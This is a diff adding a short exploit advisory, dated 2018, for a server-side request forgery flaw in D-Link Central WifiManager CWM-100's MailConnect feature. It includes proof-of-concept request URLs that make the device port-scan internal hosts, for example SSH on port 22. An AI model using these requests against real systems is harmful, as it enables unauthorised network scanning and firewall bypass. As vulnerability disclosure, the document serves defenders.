@@ -1,0 +1,28 @@
+# Exploit Title: D-LINK Central WifiManager CWM-100 - Server-Side Request Forgery
+# Author: John Page (aka hyp3rlinx)
+# Date: 2018-11-09
+# Vendor: http://us.dlink.com
+# Product Link: http://us.dlink.com/products/business-solutions/central-wifimanager-software-controller/
+# Version: Version 1.03 r0098
+# CVE: N/A
+# References:
+
+# [Security Issue]
+# Using a web browser or script SSRF can be initiated against internal/external systems 
+# to conduct port scans by leveraging D-LINKs MailConnect component.
+
+# The MailConnect feature on D-Link Central WiFiManager CWM-100 1.03 r0098 devices is intended 
+# to check a connection to an SMTP server but actually allows outbound TCP to any port on any IP address, 
+# leading to SSRF, as demonstrated by an index.php/System/MailConnect/host/127.0.0.1/port/22/secure/ URI.
+# This can undermine accountability of where scan or connections actually came from and or bypass 
+# the FW etc. This can be automated via script or using Web Browser.
+
+# [Exploit/POC]
+https://VICTIM-IP/index.php/System/MailConnect/host/port/secure/
+
+reply: OK
+
+#Scan internal port 22 SSH:
+
+https://VICTIM-IP/index.php/System/MailConnect/host/VICTIM-IP/port/22/secure/
+reply: OK
